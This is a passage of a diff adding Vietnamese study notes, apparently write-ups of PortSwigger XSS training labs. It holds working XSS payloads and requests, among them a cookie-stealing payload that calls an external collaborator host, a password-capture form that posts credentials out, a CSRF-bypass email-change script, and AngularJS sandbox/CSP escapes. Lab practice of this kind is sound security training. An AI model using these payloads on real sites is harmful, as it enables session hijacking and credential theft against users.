+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">Wpi4TG4D9h4n49ca6Z9omvwzznTGwFDB</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">178</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">bxeKl4u3U4Ti5CMPZTSymKGALWpenlcM</span><span class="o">&amp;</span><span class="nx">postId</span><span class="o">=</span><span class="mf">7</span><span class="o">&amp;</span><span class="nx">comment</span><span class="o">=</span><span class="nx">aaaa</span><span class="o">&amp;</span><span class="nx">name</span><span class="o">=</span><span class="nx">aaaa</span><span class="o">&amp;</span><span class="nx">email</span><span class="o">=</span><span class="nx">aaaaa</span><span class="o">%</span><span class="mf">40</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span><span class="o">&amp;</span><span class="nx">website</span><span class="o">=</span><span class="nx">http</span><span class="o">%</span><span class="mf">3</span><span class="nx">A</span><span class="o">%</span><span class="mf">2</span><span class="nx">F</span><span class="o">%</span><span class="mf">2</span><span class="nx">Fa</span><span class="p">.</span><span class="nx">com</span><span class="o">%</span><span class="mf">26</span><span class="nx">apos</span><span class="o">%</span><span class="mf">3</span><span class="nx">B</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">3</span><span class="nx">Balert</span><span class="o">%</span><span class="mf">28</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">F</span><span class="o">%</span><span class="mf">2</span><span class="nx">F</span><span class="o">%</span><span class="mf">3</span><span class="nx">B</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request trên, quan sát response trả về khi click đã alert thành công</p>
+<p><img alt="image.png" src="image%2063.png" /></p>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2064.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped"><strong>Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</strong><a class="headerlink" href="#lab-reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped">Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code> . Thực hiện chèn payload test thử. Nhận thấy các dấu đặc biệt đã bị encode nhưng khi viewsource, chúng ta thấy payload đã được truyền vào input chứa trong backstick ⇒ có thể thực hiện lệnh trong này</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2065.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện truyền payload sau và có thể alert thành công</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">$</span><span class="p">{</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)}</span>
+</code></pre></div>
+</li>
+<li>
+<p>Input: param <code>search</code></p>
+</li>
+<li>Output: trang chủ</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2066.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2067.png" /></p>
+</li>
+</ul>
+<h1 id="lab-exploiting-cross-site-scripting-to-steal-cookies"><strong>Lab: Exploiting cross-site scripting to steal cookies</strong><a class="headerlink" href="#lab-exploiting-cross-site-scripting-to-steal-cookies" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">Lab: Exploiting cross-site scripting to steal cookies | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng comment. Tại đây, nhận thấy input <code>Comment</code> có stored xss. Ngoài ra <code>HttpOnly</code>  đang được tắt nên có thể lấy được cookie thông qua stored xss</p>
+<p><img alt="image.png" src="image%2068.png" /></p>
+</li>
+<li>
+<p>Thực hiện sử dụng payload sau để lấy cookie của victim</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span><span class="w"> </span><span class="na">onerror</span><span class="o">=</span><span class="s">&quot;this.src=&#39;collab-link/?c=&#39;+btoa(document.cookie); this.onerror=null;&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">post</span><span class="o">/</span><span class="nx">comment</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a2c004a0453cee0811f43f400bb0012</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">eac8gSgrAdPto0xyj1A2kH510ZDb70Ad</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">392</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">rUxFW6PioMibZ0aXiFNpf73PNwakV3qP</span><span class="o">&amp;</span><span class="nx">postId</span><span class="o">=</span><span class="mf">4</span><span class="o">&amp;</span><span class="nx">comment</span><span class="o">=%</span><span class="mf">3</span><span class="nx">cimg</span><span class="o">%</span><span class="mf">20</span><span class="nx">src</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">x</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">onerror</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="k">this</span><span class="p">.</span><span class="nx">src</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="s1">&#39;http%3a%2f%2fxlm9h23uaqwolyvslnb1avlhk8qzergf5.oastify.com%2f%3fc%3d&#39;</span><span class="o">%</span><span class="mf">2</span><span class="nx">bbtoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">%</span><span class="mf">3</span><span class="nx">b</span><span class="o">%</span><span class="mf">20</span><span class="k">this</span><span class="p">.</span><span class="nx">onerror</span><span class="o">%</span><span class="mf">3</span><span class="nx">dnull</span><span class="o">%</span><span class="mf">3</span><span class="nx">b</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">3</span><span class="nx">e</span><span class="o">&amp;</span><span class="nx">name</span><span class="o">=%</span><span class="mf">27</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">3</span><span class="nx">Cimg</span><span class="o">+</span><span class="nx">src</span><span class="o">%</span><span class="mf">3</span><span class="nx">Dx</span><span class="o">+</span><span class="nx">onerror</span><span class="o">%</span><span class="mf">3</span><span class="nx">Dalert</span><span class="o">%</span><span class="mf">281</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">&amp;</span><span class="nx">email</span><span class="o">=</span><span class="nx">a</span><span class="o">%</span><span class="mf">40</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span><span class="o">&amp;</span><span class="nx">website</span><span class="o">=</span><span class="nx">http</span><span class="o">%</span><span class="mf">3</span><span class="nx">A</span><span class="o">%</span><span class="mf">2</span><span class="nx">F</span><span class="o">%</span><span class="mf">2</span><span class="nx">Fa</span><span class="p">.</span><span class="nx">com</span><span class="o">%</span><span class="mf">26</span><span class="nx">apos</span><span class="o">%</span><span class="mf">3</span><span class="nx">B</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">3</span><span class="nx">Balert</span><span class="o">%</span><span class="mf">28</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">F</span><span class="o">%</span><span class="mf">2</span><span class="nx">F</span><span class="o">%</span><span class="mf">3</span><span class="nx">B</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request trên, quan sát thấy cookie trả về trong burp collab</p>
+<p><img alt="image.png" src="image%2069.png" /></p>
+</li>
+<li>
+<p>Decode giá trị lấy được, thay vào cookie và hoàn thành giải lab</p>
+<ul>
+<li>
+<p>Decoded</p>
+<p><img alt="image.png" src="image%2070.png" /></p>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2071.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-exploiting-cross-site-scripting-to-capture-passwords"><strong>Lab: Exploiting cross-site scripting to capture passwords</strong><a class="headerlink" href="#lab-exploiting-cross-site-scripting-to-capture-passwords" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords">Lab: Exploiting cross-site scripting to capture passwords | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện điều hướng đến chức năng comment</li>
+<li>
+<p>Tại đây, thực hiện post comment với nội dung sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">name</span><span class="o">=</span><span class="na">username</span><span class="w"> </span><span class="na">id</span><span class="o">=</span><span class="na">username</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">type</span><span class="o">=</span><span class="na">password</span><span class="w"> </span><span class="na">name</span><span class="o">=</span><span class="na">password</span><span class="w"> </span><span class="na">onchange</span><span class="o">=</span><span class="s">&quot;if(this.value.length)fetch(&#39;collab-url&#39;,{</span>
+<span class="s">method:&#39;POST&#39;,</span>
+<span class="s">mode: &#39;no-cors&#39;,</span>
+<span class="s">body:username.value+&#39;:&#39;+this.value</span>
+<span class="s">});&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, khi victim điền password thì sẽ tự động gửi về collab. Lấy được password</p>
+<p><img alt="image.png" src="image%2072.png" /></p>
+</li>
+<li>
+<p>Thực hiện login bằng credential trên thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2073.png" /></p>
+</li>
+<li>
+<p>Giải thích payload</p>
+<ul>
+<li>Khi victim nhập uname, pwd thì vì ô pwd thay đổi nên sẽ tự động gửi cred</li>
+<li>Tiếp theo, chúng ta cần thêm mode cors vì sop ngăn ko được gửi request đến domain khác????</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-exploiting-xss-to-bypass-csrf-defenses"><strong>Lab: Exploiting XSS to bypass CSRF defenses</strong><a class="headerlink" href="#lab-exploiting-xss-to-bypass-csrf-defenses" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf">Lab: Exploiting XSS to bypass CSRF defenses | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào tài khoản <code>wiener:peter</code> . Tại đây, thực hiện điều hướng đến chức năng <code>My account &gt; Update email</code></p>
+<p><img alt="image.png" src="image%2074.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>GET /my-account</code> . Tại đây, quan sát thấy response trả về <code>csrf</code> trong thẻ input form</p>
+<p><img alt="image.png" src="image%2075.png" /></p>
+</li>
+<li>
+<p>Quan sát request gửi tới API <code>POST /my-account/change-email</code> có body gồm  2 param sau cùng với header như POC</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2076.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Điều hướng đến chức năng <code>Post &gt; Comment</code> . Tại đây, có stored xss ở trường input comment body. Thực hiện chèn script</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
+<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">bruh</span><span class="p">(){</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://&lt;url&gt;/my-account&#39;</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">DOMParser</span><span class="p">();</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parseFromString</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;text/html&#39;</span><span class="p">);</span>
+
+<span class="kd">var</span><span class="w"> </span><span class="nx">csrf_token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">doc</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s1">&#39;csrf&#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+
+<span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://&lt;url&gt;/my-account/change-email&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">URLSearchParams</span><span class="p">({</span>
+<span class="w">                </span><span class="s1">&#39;csrf&#39;</span><span class="o">:</span><span class="w"> </span><span class="nx">csrf_token</span><span class="p">,</span>
+<span class="w">                </span><span class="s1">&#39;email&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;hacker@evil-user.net&#39;</span>
+<span class="w">            </span><span class="p">})</span>
+<span class="p">});</span>
+<span class="p">}</span>
+<span class="nx">bruh</span><span class="p">();</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Lưu ý phần header cần định nghĩa rõ ràng nếu không thì khi request gửi sẽ mặc định encode utf-8 ⇒ không có request đúng ý</p>
+</li>
+<li>Thực hiện comment và hoàn thành giải lab</li>
+</ul>
+<p><img alt="image.png" src="image%2077.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-with-angularjs-sandbox-escape-without-strings"><strong>Lab: Reflected XSS with AngularJS sandbox escape without strings</strong><a class="headerlink" href="#lab-reflected-xss-with-angularjs-sandbox-escape-without-strings" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings">Lab: Reflected XSS with AngularJS sandbox escape without strings | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code></p>
+<p><img alt="image.png" src="image%2078.png" /></p>
+</li>
+<li>
+<p>Tại đây, thực hiện tìm kiếm với chuỗi nào đó và nhận thấy client dùng angular js để parse url</p>
+<p><img alt="image.png" src="image%2079.png" /></p>
+</li>
+<li>
+<p>Thực hiện dùng payload sau để vượt qua sandbox của angular js</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">toString</span><span class="p">().</span><span class="kr">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">charAt</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="p">[].</span><span class="nx">join</span><span class="p">;[</span><span class="mf">1</span><span class="p">]</span><span class="o">|</span><span class="nx">orderBy</span><span class="o">:</span><span class="nx">toString</span><span class="p">().</span><span class="kr">constructor</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">120</span><span class="p">,</span><span class="mf">61</span><span class="p">,</span><span class="mf">97</span><span class="p">,</span><span class="mf">108</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">40</span><span class="p">,</span><span class="mf">49</span><span class="p">,</span><span class="mf">41</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>URL</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">url</span><span class="p">&gt;</span><span class="o">/?</span><span class="nx">search</span><span class="o">=</span><span class="mf">1</span><span class="o">&amp;</span><span class="nx">toString</span><span class="p">().</span><span class="kr">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">charAt</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="p">[].</span><span class="nx">join</span><span class="p">;[</span><span class="mf">1</span><span class="p">]</span><span class="o">|</span><span class="nx">orderBy</span><span class="o">:</span><span class="nx">toString</span><span class="p">().</span><span class="kr">constructor</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">120</span><span class="p">,</span><span class="mf">61</span><span class="p">,</span><span class="mf">97</span><span class="p">,</span><span class="mf">108</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">40</span><span class="p">,</span><span class="mf">49</span><span class="p">,</span><span class="mf">41</span><span class="p">)</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Ở đây, trong lý thuyết có nhắc đến cách vượt qua kiểm tra ký tự đặc biệt của sandbox bằng cách dùng <code>toString().constructor.prototype.charAt=[].join</code> . Sau đó, thì thực hiện truyền lệnh <code>toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)</code> sau <code>orderBy</code> để lệnh có thể chạy được và tạo thành chuỗi <code>alert(1)</code></p>
+</li>
+<li>
+<p>Thực hiện gửi URL và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2080.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-with-angularjs-sandbox-escape-and-csp"><strong>Lab: Reflected XSS with AngularJS sandbox escape and CSP</strong><a class="headerlink" href="#lab-reflected-xss-with-angularjs-sandbox-escape-and-csp" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp">Lab: Reflected XSS with AngularJS sandbox escape and CSP | Web Security Academy</a></p>
+<ul>
+<li>Em thay đổi biểu thức sau orderby để giảm số ký tự nhờ tham khảo bài viết này <a href="https://portswigger.net/research/angularjs-csp-bypass-in-56-characters">AngularJS CSP bypass in 56 characters | PortSwigger Research</a></li>
+<li>Điều hướng đến chức năng <code>Search</code></li>
+<li>
+<p>Tại đây, quan sát thấy web dùng angularjs</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2081.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện truyền payload sau, tuy nhiên bị chặn vì quá 80 ký tự</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">autofocus</span><span class="w"> </span><span class="na">ng-focus</span><span class="o">=</span><span class="s">&quot;$event.path|orderBy:&#39;[].constructor.from([1],alert)&#39;&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2082.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Payload trên là payload basic theo lý thuyết: vì ngoài sự kiện của js, angular có những sự kiện riêng. Trong mỗi sự kiện thì lại có một object đặc biệt là <code>$event</code> mà đối tượng này có property mà property cuối cùng luôn là <code>window</code> thứ mà sandbox không cho chúng ta chạm đến. Để có thể chạm đến window, chúng ta cần gọi <code>path</code> tuy nhiên thì với browser mới sẽ chỉ còn <code>composedPath</code> . Tiếp đến, cần tìm câu lệnh ngắn hơn để truyền vào sau orderBy có thể tham khảo trong bài research</p>
+</li>
+<li>
+<p>Cuối cùng chúng ta ra được payload sau</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">autofocus</span><span class="w"> </span><span class="na">ng-focus</span><span class="o">=</span><span class="err">$</span><span class="na">event.composedPath</span><span class="err">()|</span><span class="na">orderBy</span><span class="err">:&#39;(</span><span class="na">y</span><span class="o">=</span><span class="na">alert</span><span class="err">)(</span><span class="na">1</span><span class="err">)&#39;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, để không cần dùng autofocus, chúng ta có thể thêm id và gửi link chứa hash⇒ tự động alert</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">id</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">ng-focus</span><span class="o">=</span><span class="err">$</span><span class="na">event.composedPath</span><span class="err">()|</span><span class="na">orderBy</span><span class="err">:&#39;(</span><span class="na">y</span><span class="o">=</span><span class="na">alert</span><span class="err">)(</span><span class="na">1</span><span class="err">)&#39;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>URL</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">lab</span><span class="err">-</span><span class="na">url</span><span class="p">&gt;</span><span class="o">/?</span><span class="nx">search</span><span class="o">=%</span><span class="mf">3</span><span class="nx">Cinput</span><span class="o">+</span><span class="nx">id</span><span class="o">%</span><span class="mf">3</span><span class="nx">Dx</span><span class="o">+</span><span class="nx">ng</span><span class="o">-</span><span class="nx">focus</span><span class="o">%</span><span class="mf">3</span><span class="nx">D</span><span class="o">%</span><span class="mf">24</span><span class="nx">event</span><span class="p">.</span><span class="nx">composedPath</span><span class="o">%</span><span class="mf">28</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">7</span><span class="nx">CorderBy</span><span class="o">%</span><span class="mf">3</span><span class="nx">A</span><span class="o">%</span><span class="mf">27</span><span class="o">%</span><span class="mf">28</span><span class="nx">y</span><span class="o">%</span><span class="mf">3</span><span class="nx">Dalert</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">281</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">27</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">23</span><span class="nx">x</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện dùng exploit server gửi link cho victim</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nx">location</span><span class="o">=</span><span class="s2">&quot;&lt;url-lab&gt;/?search=%3Cinput+id%3Dx+ng-focus%3D%24event.composedPath()|orderBy%3A%27(y%3Dalert)(document.cookie)%27%3E#x&quot;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2083.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi cho victim. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2084.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-with-event-handlers-and-href-attributes-blocked"><strong>Lab: Reflected XSS with event handlers and <code>href</code> attributes blocked</strong><a class="headerlink" href="#lab-reflected-xss-with-event-handlers-and-href-attributes-blocked" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">Lab: Reflected XSS with event handlers and href attributes blocked | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code> . Quan sát thấy ở đây có cơ chế chặn các thẻ  event, tag ngoại trừ <code>&lt;svg&gt;</code> , <code>&lt;a&gt;</code> . Tuy nhiên vì các thẻ event bị chặn cũng như attribute <code>href</code> của <code>a</code> cũng bị chặn nên chúng ta không thể khai xss ở bài này một cách thường được</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2085.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên vì thẻ <code>&lt;svg&gt;</code> được phép cùng các thẻ <code>&lt;animate&gt;</code> chúng ta có thể set value cho thuộc tính <code>href</code> bằng payload sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">animate</span><span class="w"> </span><span class="na">attributeName</span><span class="o">=</span><span class="s">&quot;href&quot;</span><span class="w"> </span><span class="na">from</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="w"> </span><span class="na">to</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="w">  </span><span class="p">/&gt;&lt;</span><span class="nt">text</span><span class="w"> </span><span class="na">x</span><span class="o">=</span><span class="s">&quot;20&quot;</span><span class="w"> </span><span class="na">y</span><span class="o">=</span><span class="s">&quot;20&quot;</span><span class="p">&gt;</span><span class="nx">click</span><span class="w"> </span><span class="nx">me</span><span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Quan sát khi gửi payload đi thì alert thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2086.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked"><strong>Lab: Reflected XSS in a JavaScript URL with some characters blocked</strong><a class="headerlink" href="#lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked">Lab: Reflected XSS in a JavaScript URL with some characters blocked | Web Security Academy</a></p>
+<ul>
+<li>Em xem solution chỗ tạo ra alert ạ</li>
+<li>
+<p>Thực hiện chọn một bài post bất kỳ. Thực hiện view source tại trang xem sản phẩm thì thấy đường link quay lại trang chủ lấy input là path và đẩy vào trong fetch ⇒ có thể escape</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2087.png" /></p>
+</li>
+</ul>
+</li>
+<li>
